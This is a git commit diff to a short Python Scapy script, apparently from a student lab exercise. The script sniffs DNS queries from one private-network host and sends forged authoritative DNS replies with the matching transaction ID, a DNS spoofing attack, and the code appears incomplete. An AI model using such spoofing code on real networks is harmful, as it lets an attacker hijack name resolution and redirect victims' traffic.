2cacf30090f2c0d6c5d6e7fd1e46f464afff5f18
BenGanon <92310078+Ben-Ganon@users.noreply.github.com>
2022-05-29 20:38:20 +0300

    uodate

--- ex1.py
+++ ex1.py
@@ -9,16 +9,17 @@ import sys
 
 
 packet_filt = " and ".join([
-    "udp dst port 53", # dns port filtering
-    "udp[10] & 0x80 = 0", # dns only
-    "src host 192.168.59.3" # ip source
-    ])
-
-def dns_reply(packet):
-    send(IP(dst="192.168.59.3", src="192.168.59.3")/UDP(dport="53", sport="53")/DNS(id=packet[DNS].id, rd=0, qr=1, aa=1, qtype = 1, qclass = 1, qname = packet.qname))
+#"udp dst port 53", # dns port filtering
+"udp[10] & 0x80 = 0", # dns only
+"src host 192.168.59.3"]) # ip source	
 
 
-capture = sniff(filter = packet_filt, store=0, prn = dns_reply, count=0,timeout=10, started_callback = lambda x:print("started sniffing"))
+def dns_reply(packet): 
+	print("sending packet")
+	send(IP(dst="192.168.59.5", src="192.168.59.3")/UDP(dport="53", sport="53")/DNS(id=packet[DNS].id, rd=0, qr=1, aa=1, qtype = 1, qclass = 1, qname = packet.qname))
+
+print("started sniffing")
+sniff(filter = packet_filt,prn = dns_reply, store=0, iface="enp0s10")
 
 
 
